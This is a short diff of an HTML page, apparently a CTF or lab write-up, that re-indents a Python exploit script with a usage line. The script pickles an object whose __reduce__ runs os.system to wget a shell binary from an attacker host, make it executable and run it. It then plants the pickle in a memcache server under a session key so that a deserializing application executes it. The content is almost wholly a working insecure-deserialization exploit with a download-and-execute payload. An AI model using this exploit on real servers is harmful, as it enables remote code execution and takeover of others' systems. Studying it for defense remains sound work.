@@ -2198,12 +2198,12 @@ import os
 import sys
 from pymemcache.client import base
 class RCE:
-def __reduce__(self):
-cmd = ('wget http://{}:5000/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'.format(sys.argv[1]))
-return os.system, (cmd,)
+    def __reduce__(self):
+        cmd = ('wget http://{}:5000/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'.format(sys.argv[1]))
+        return os.system, (cmd,)
 if __name__ == '__main__':
-client = base.Client((sys.argv[2], 11211))
-client.set(sys.argv[3], pickle.dumps(RCE()))
+    client = base.Client((sys.argv[2], 11211))
+    client.set(sys.argv[3], pickle.dumps(RCE()))
             </pre>
         </ul>
         <li>python exploit.py &lt;attacker ip&gt; &lt;memcache server ip&gt; &lt;session:&lt;value&gt;&gt;</li>
